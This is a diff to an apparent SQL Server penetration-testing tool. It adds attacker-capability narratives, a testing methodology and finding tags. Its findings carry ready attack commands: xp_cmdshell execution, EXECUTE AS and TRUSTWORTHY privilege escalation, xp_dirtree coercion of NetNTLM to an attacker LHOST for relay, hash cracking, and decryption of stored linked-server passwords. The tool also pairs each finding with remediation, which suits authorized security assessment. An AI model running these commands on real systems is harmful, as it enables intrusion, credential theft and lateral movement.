@@ -213,10 +213,184 @@ def _step(phase, step, tool, cmd, why):
     return {"phase": phase, "step": step, "tool": tool, "cmd": cmd, "why": why}
 
 
-def _finding(sev, title, target, detail, tool, cmd, rem, cwes):
+# Detailed, capability-focused narratives per finding kind - the "what this
+# actually lets an attacker do" explanation for the report + write-ups. Accurate,
+# educational, and specific to SQL Server.
+_NARRATIVE = {
+    "blank_login": (
+        "A SQL Server login (classically 'sa', the built-in sysadmin) authenticates "
+        "with an empty or trivial password. 'sa' is a member of the sysadmin fixed "
+        "server role, so this is total control of the instance with no exploitation "
+        "required: read or modify every database, dump all login password hashes "
+        "(sys.sql_logins), decrypt stored credentials and linked-server passwords, "
+        "and - most importantly - obtain operating-system command execution via "
+        "xp_cmdshell (which sysadmin can enable in two statements). Because the "
+        "commands then run as the SQL Server service account, this is a direct path "
+        "from an unauthenticated/low-effort finding to code execution on the host and, "
+        "typically, to SYSTEM and onward into the domain."),
+    "sysadmin_creds": (
+        "The supplied credentials are a member of the sysadmin fixed server role - "
+        "effectively administrator of the database instance. A sysadmin can enable and "
+        "run xp_cmdshell for OS command execution as the service account, load CLR "
+        "assemblies or SQL Agent jobs as alternative execution paths, read every "
+        "database regardless of object permissions, dump all login hashes, and "
+        "decrypt stored credentials and linked-server passwords with the Service "
+        "Master Key. There is no privilege boundary left inside SQL Server to cross; "
+        "the remaining work is turning instance-admin into host and domain compromise."),
+    "xp_cmdshell": (
+        "xp_cmdshell is an extended stored procedure that spawns a Windows command "
+        "shell and runs an arbitrary string, returning its output to the SQL client. "
+        "Every command executes as the SQL Server *service account* - on a default "
+        "install a virtual account (NT Service\\MSSQLSERVER) or, very commonly in AD "
+        "environments, a domain service account. That is code execution on the "
+        "database host: read/write the filesystem, run PowerShell, add a local user if "
+        "the account is a local admin (service accounts often are), and - because the "
+        "service account almost always holds SeImpersonatePrivilege - escalate to "
+        "NT AUTHORITY\\SYSTEM with a Potato-family technique. From SYSTEM you can dump "
+        "LSASS for cached domain credentials and the machine account and pivot; if the "
+        "service runs as a domain account, its Kerberos/NetNTLM identity can also be "
+        "coerced and relayed. xp_cmdshell is disabled by default, but any sysadmin "
+        "re-enables it in two sp_configure statements - so 'disabled' is a speed bump, "
+        "not a control, once your login is sysadmin."),
+    "rce_confirmed": (
+        "recce executed an operating-system command on the host through SQL Server and "
+        "captured its output, proving code execution as the service account. This is "
+        "the pivot point from database access to host compromise: the same primitive "
+        "runs a beacon, adds an account, reads protected files, or (via "
+        "SeImpersonate -> SYSTEM) dumps credentials for lateral movement."),
+    "impersonation": (
+        "The current login can EXECUTE AS a higher-privileged login - here one that is "
+        "a sysadmin. SQL Server impersonation switches your execution context to the "
+        "target login for the rest of the session, so a single 'EXECUTE AS "
+        "LOGIN = ...' turns a low-privileged principal into sysadmin with no password "
+        "and no exploit. This is a pure logic/permission flaw (an over-broad IMPERSONATE "
+        "grant), it leaves little forensic trace, and it immediately unlocks every "
+        "sysadmin capability including xp_cmdshell."),
+    "trustworthy": (
+        "A database is marked TRUSTWORTHY and is owned by a sysadmin. TRUSTWORTHY lets "
+        "code inside that database act outside it, so a principal who is db_owner there "
+        "can create a stored procedure WITH EXECUTE AS OWNER; because the owner is a "
+        "sysadmin, the procedure runs with sysadmin rights and can add the attacker to "
+        "the sysadmin role. This is a classic, reliable SQL Server privilege-escalation "
+        "primitive - db_owner on the right database is equivalent to instance admin - "
+        "and it needs only T-SQL, no OS access."),
+    "linked_reachable": (
+        "The instance defines linked servers - preconfigured connections to other SQL "
+        "Server instances used for cross-server queries. From this foothold you can run "
+        "queries (OPENQUERY) and, where 'rpc out' is enabled, arbitrary T-SQL "
+        "(EXEC ... AT [link]) on the remote instance in the security context its linked "
+        "login maps to. Linked logins frequently map to a fixed, high-privileged remote "
+        "account (often sa), so a linked server is both a lateral-movement path and a "
+        "potential privilege-escalation path onto another database host - and links "
+        "chain, so one hop can lead to many."),
+    "linked_sysadmin": (
+        "Following the linked-server chain, recce reached a remote SQL Server instance "
+        "where your effective login is a sysadmin. That means full control of a second "
+        "(or Nth) database host reached entirely through trusted SQL connections - no "
+        "new credentials needed. On that instance you have the whole sysadmin toolkit, "
+        "including xp_cmdshell for OS command execution as *its* service account, so a "
+        "single misconfigured linked login can cascade into compromise of every "
+        "instance in the trust mesh."),
+    "linked_fixed_login": (
+        "A linked server uses a fixed login mapping - a specific remote login with a "
+        "password stored on this instance - rather than passing the caller's identity. "
+        "SQL Server keeps that password encrypted with the Service Master Key, and a "
+        "sysadmin can decrypt it back to cleartext (PowerUpSQL's "
+        "Get-SQLServerLinkedServerLogin does exactly this). When the mapping is to a "
+        "privileged remote account such as sa, recovering it yields sysadmin on the "
+        "remote instance and a reusable credential that may work elsewhere in the estate."),
+    "hashes": (
+        "recce read the password hashes of the SQL logins from sys.sql_logins (a "
+        "sysadmin/CONTROL SERVER capability). These are crackable offline with hashcat "
+        "mode 1731; SQL logins are frequently set to weak or reused passwords, and a "
+        "cracked 'sa' or service login often authenticates to other SQL Servers - and "
+        "sometimes to Windows - across the environment, turning one instance's hashes "
+        "into estate-wide access."),
+    "stored_credentials": (
+        "SQL Server stores CREDENTIAL objects (and SQL Agent proxies built on them) that "
+        "bind a Windows/domain account and its secret for use by jobs, linked servers "
+        "and external access. The account name (credential_identity) is readable here "
+        "and is often a privileged service or backup account; the password is encrypted "
+        "with the Service Master Key and is recoverable by a sysadmin with PowerUpSQL. "
+        "Recovering these yields real domain credentials that typically work well "
+        "beyond SQL Server itself."),
+    "ntlm_disclosure": (
+        "Before authentication, SQL Server's NTLM negotiation leaks the host's NetBIOS "
+        "name, DNS domain and FQDN. This is low-severity on its own but valuable for "
+        "targeting: it confirms domain membership and names the box for coercion/relay "
+        "and for building a picture of the environment without credentials."),
+    "no_encryption": (
+        "The instance advertised that it does not support TDS encryption, so login "
+        "packets - including credentials for SQL authentication - and query data cross "
+        "the network unprotected. An attacker positioned on the path (or performing "
+        "ARP/LLMNR poisoning) can capture credentials and sensitive result sets, and "
+        "the lack of enforced encryption also eases NTLM relay against the service."),
+    "eol": (
+        "The SQL Server build is past Microsoft's support lifecycle and no longer "
+        "receives security updates. Beyond specific unpatched CVEs, an end-of-life "
+        "database engine accumulates known weaknesses over time and cannot be brought "
+        "to a secure baseline; it should be treated as a standing high-value target and "
+        "prioritised for upgrade."),
+    "relay": (
+        "Any authenticated login can make SQL Server reach out to a UNC path (e.g. via "
+        "xp_dirtree), causing the *service account* to authenticate to an attacker-"
+        "controlled host. That NetNTLM authentication can be relayed: to LDAP on a "
+        "domain controller for resource-based constrained delegation or shadow "
+        "credentials, to another SQL Server or SMB host where the account is privileged, "
+        "or cracked offline. Because SQL service accounts are often domain accounts with "
+        "broad rights, coercing and relaying one is a high-impact, credential-free-ish "
+        "pivot out of the database and into the domain."),
+}
+
+
+def narrative_for(kind: str) -> str:
+    return _NARRATIVE.get(kind, "")
+
+
+# How MSSQL is tested end-to-end - the methodology shown at the top of the report so
+# a reader understands what each phase looks for and why.
+TESTING_NARRATIVE = [
+    ("1. Discovery & fingerprint",
+     "Identify SQL Server endpoints and enumerate named instances, versions and TCP "
+     "ports via the SQL Browser service (UDP 1434), then send a TDS pre-login to read "
+     "the exact build number and whether login encryption is enforced - all without "
+     "credentials. The version drives CVE/EOL assessment and tells you which "
+     "techniques apply."),
+    ("2. Authentication testing",
+     "Test what you can log in as: blank/default 'sa', anonymous/guest, and - with "
+     "supplied credentials - which instances accept them and at what privilege "
+     "(nxc reports 'Pwn3d!' when the login is effectively sysadmin). Note whether the "
+     "instance allows SQL logins (mixed mode) or Windows auth only, which decides "
+     "whether password spraying against SQL logins is in scope."),
+    ("3. Privilege assessment",
+     "Establish your effective rights: are you already sysadmin? Which logins are "
+     "sysadmin (targets for impersonation/cracking)? Can you EXECUTE AS a "
+     "sysadmin login? Are you db_owner on a TRUSTWORTHY database owned by a sysadmin? "
+     "These determine whether escalation is needed and which path is shortest."),
+    ("4. Escalation chains",
+     "Chain the misconfigurations into sysadmin: impersonation (EXECUTE AS), "
+     "TRUSTWORTHY + db_owner (a proc WITH EXECUTE AS OWNER), and the linked-server "
+     "graph - recursively following linked servers (EXEC ... AT) to any instance where "
+     "your mapped login is sysadmin. Each hop is verified from live server state, not "
+     "assumed."),
+    ("5. Command execution (effect)",
+     "Turn instance-admin into host code execution as the SQL service account, and "
+     "capture output: xp_cmdshell (native), OLE Automation (sp_OACreate), or a SQL "
+     "Agent CmdExec job - the alternatives matter because xp_cmdshell is often "
+     "disabled or monitored. From here, SeImpersonate typically yields SYSTEM."),
+    ("6. Secrets & lateral movement",
+     "Harvest what enables the next hop: sys.sql_logins password hashes (crack "
+     "offline), stored CREDENTIAL objects and Agent proxies (privileged accounts), and "
+     "fixed linked-server login passwords (decryptable with the Service Master Key). "
+     "Where Windows auth is in play, coerce the service account over UNC and relay its "
+     "NetNTLM to LDAP/SMB/another SQL Server."),
+]
+
+
+def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind=""):
     return {"category": "mssql", "severity": sev, "title": title, "target": target,
             "detail": detail, "tool": tool, "command": cmd, "remediation": rem,
-            "cwes": list(cwes)}
+            "cwes": list(cwes), "kind": kind, "narrative": _NARRATIVE.get(kind, "")}
 
 
 def _port_scripts(host: Host, portid: int) -> dict:
@@ -250,7 +424,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     _fill("impacket-mssqlclient sa@<ip> -p <port>   # blank password; then "
                           "enable_xp_cmdshell; xp_cmdshell whoami", ctx),
                     "Set a strong sa password (or disable sa); enforce a password policy.",
-                    ["CWE-521", "CWE-1392"]))
+                    ["CWE-521", "CWE-1392"], kind="blank_login"))
 
             # xp_cmdshell already enabled -> RCE as the service account.
             xpc = scripts.get("ms-sql-xp-cmdshell", "")
@@ -261,7 +435,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "service account.", "impacket-mssqlclient / nxc",
                     _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
                     "Disable xp_cmdshell; run SQL under a low-privilege gMSA.",
-                    ["CWE-250"]))
+                    ["CWE-250"], kind="xp_cmdshell"))
 
             # Pre-auth NTLM / host / domain disclosure (relay/coercion target).
             if "ms-sql-ntlm-info" in scripts:
@@ -272,7 +446,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     _fill("EXEC xp_dirtree '\\\\<LHOST>\\x';  # once logged in, coerce the "
                           "service account's NetNTLM -> relay (impacket-ntlmrelayx)", ctx),
                     "Restrict exposure; require SMB signing + EPA to blunt relay.",
-                    ["CWE-200"]))
+                    ["CWE-200"], kind="ntlm_disclosure"))
 
             # TDS login encryption not supported at all -> creds sniffable.
             enc = pl.get("encryption")
@@ -284,7 +458,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     _fill("impacket-mssqlclient <user>@<ip> -p <port>   # traffic is unencrypted",
                           ctx),
                     "Install a certificate and enable Force Encryption on the instance.",
-                    ["CWE-319"]))
+                    ["CWE-319"], kind="no_encryption"))
 
             # Unsupported / end-of-life SQL Server (no security patches).
             ver = pl.get("version") or t.version
@@ -296,7 +470,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "security updates.", "version",
                     _fill("nmap -p <port> --script ms-sql-info <ip>", ctx),
                     "Upgrade to a supported SQL Server release.",
-                    ["CWE-1104"]))
+                    ["CWE-1104"], kind="eol"))
     return out
 
 
@@ -711,7 +885,7 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             f"{me} is a member of the sysadmin server role (xp_cmdshell / RCE).",
             "nxc / impacket-mssqlclient",
             _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
-            "Least-privilege the login; remove sysadmin.", ["CWE-250", "CWE-269"]))
+            "Least-privilege the login; remove sysadmin.", ["CWE-250", "CWE-269"], kind="sysadmin_creds"))
 
     imp_sa = [r[0] for r in enum.get("impersonate", []) if len(r) > 1 and r[1] == "1"]
     if imp_sa and not is_sa:
@@ -723,7 +897,7 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "impacket-mssqlclient",
             _fill(f"EXECUTE AS LOGIN = '{who}'; SELECT IS_SRVROLEMEMBER('sysadmin'); "
                   "-- then run xp_cmdshell; REVERT", ctx),
-            "Remove IMPERSONATE grants pointing at sysadmin logins.", ["CWE-269"]))
+            "Remove IMPERSONATE grants pointing at sysadmin logins.", ["CWE-269"], kind="impersonation"))
 
     trust = [r for r in enum.get("databases", []) if len(r) > 2 and r[1] == "1"]
     trust_sa = trustworthy_sysadmin_dbs(enum)
@@ -753,7 +927,7 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
                 _fill(f"USE [{db}]; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
                       "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;", ctx),
                 "Turn off TRUSTWORTHY; don't set a sysadmin as the owner of a user DB.",
-                ["CWE-269"]))
+                ["CWE-269"], kind="trustworthy"))
 
     links = [r[0] for r in enum.get("links", [])]
     if links:
@@ -764,7 +938,7 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "a privileged account (sa) on the remote.", "impacket-mssqlclient / mssqlpwner",
             _fill("SELECT * FROM OPENQUERY([%s], 'SELECT SYSTEM_USER, "
                   "IS_SRVROLEMEMBER(''sysadmin'')');" % links[0], ctx),
-            "Review linked-server login mappings; avoid mapping to sysadmin.", ["CWE-284"]))
+            "Review linked-server login mappings; avoid mapping to sysadmin.", ["CWE-284"], kind="linked_reachable"))
 
     cfg = {r[0]: r[1] for r in enum.get("config", []) if len(r) > 1}
     if cfg.get("xp_cmdshell") == "1":
@@ -773,7 +947,7 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "xp_cmdshell = 1 - run OS commands as the SQL service account now.",
             "nxc / impacket-mssqlclient",
             _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
-            "Disable xp_cmdshell; run SQL under a low-privilege gMSA.", ["CWE-250"]))
+            "Disable xp_cmdshell; run SQL under a low-privilege gMSA.", ["CWE-250"], kind="xp_cmdshell"))
 
     hashes = [r[0] for r in enum.get("hashes", [])]
     if hashes:
@@ -783,7 +957,7 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "offline with hashcat -m 1731 and reuse across the estate.",
             "impacket-mssqlclient",
             "hashcat -m 1731 mssql_hashes.txt wordlist.txt",
-            "Rotate SQL logins; enforce a strong password policy.", ["CWE-522"]))
+            "Rotate SQL logins; enforce a strong password policy.", ["CWE-522"], kind="hashes"))
 
     # Stored credential objects + Agent proxies -> the (often privileged) accounts
     # SQL Server holds a secret for. The identity is readable; the password is
@@ -803,7 +977,7 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
                   "Get-SQLServerLinkedServerLogin -Instance <ip>   # decrypt with the SMK",
                   ctx),
             "Remove unused credentials/proxies; use gMSA over stored passwords.",
-            ["CWE-522", "CWE-257"]))
+            ["CWE-522", "CWE-257"], kind="stored_credentials"))
 
     # Linked-server logins with a FIXED mapping (uses_self_credential=0) carry a
     # stored remote password - often mapping to sa on the remote instance.
@@ -822,7 +996,7 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             _fill("PowerUpSQL: Get-SQLServerLinkedServerLogin -Instance <ip>   "
                   "# decrypts the stored linked-server passwords (sysadmin)", ctx),
             "Use self-mapping / least-privilege remote logins; avoid mapping to sa.",
-            ["CWE-522", "CWE-257"]))
+            ["CWE-522", "CWE-257"], kind="linked_fixed_login"))
         chain.append("recover stored linked-server credential(s) ("
                      + ", ".join(f"{srv}->{remote}" for srv, remote in fixed[:3]) + ")")
 
@@ -940,7 +1114,7 @@ def link_findings(target: dict, nodes: list[dict], creds: dict | None):
             f"(depth {n['depth']}).", "impacket-mssqlclient / mssqlpwner",
             _nested_at(n["path"], _RCE_INNER),
             "Fix the linked-server login mapping (don't map to sysadmin); disable "
-            "'rpc out' where not required.", ["CWE-269", "CWE-284"]))
+            "'rpc out' where not required.", ["CWE-269", "CWE-284"], kind="linked_sysadmin"))
         chain.append(f"reach SYSADMIN on {server} via linked chain ({route}) -> "
                      "xp_cmdshell RCE")
     if nodes and not sa_nodes:
@@ -952,7 +1126,7 @@ def link_findings(target: dict, nodes: list[dict], creds: dict | None):
                 for n in nodes[:10]) + f". Deepest: {' -> '.join(deepest['path'])}.",
             "impacket-mssqlclient / mssqlpwner",
             _nested_at(deepest["path"], "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"),
-            "Review linked-server login mappings and 'rpc out' settings.", ["CWE-284"]))
+            "Review linked-server login mappings and 'rpc out' settings.", ["CWE-284"], kind="linked_reachable"))
     return fs, chain
 
 
@@ -1002,7 +1176,7 @@ def relay_finding(target: dict, rtargets: list[dict], lhost: str,
         "high", "UNC coercion -> NTLM relay of the SQL service account", tgt, detail,
         "impacket-ntlmrelayx + mssqlclient", cmd,
         "Enforce SMB signing + LDAP channel binding/EPA; run SQL under a low-priv gMSA.",
-        ["CWE-522", "CWE-269"])
+        ["CWE-522", "CWE-269"], kind="relay")
 
 
 def run_xp_dirtree(ip: str, creds: dict, lhost: str, port: int = _DEFAULT_PORT,
@@ -1115,6 +1289,8 @@ def findings_to_vulns(fs: list[dict]) -> dict:
         ip = f["target"].split(":")[0]
         port = int(f["target"].split(":")[1]) if ":" in f["target"] else 1433
         evidence = f.get("detail", "")
+        if f.get("narrative"):
+            evidence += f"\n\nWhat this enables:\n{f['narrative']}"
         if f.get("command"):
             evidence += f"\n\nProve / next step:\n{f['command']}"
         by_ip.setdefault(ip, []).append(Vuln(
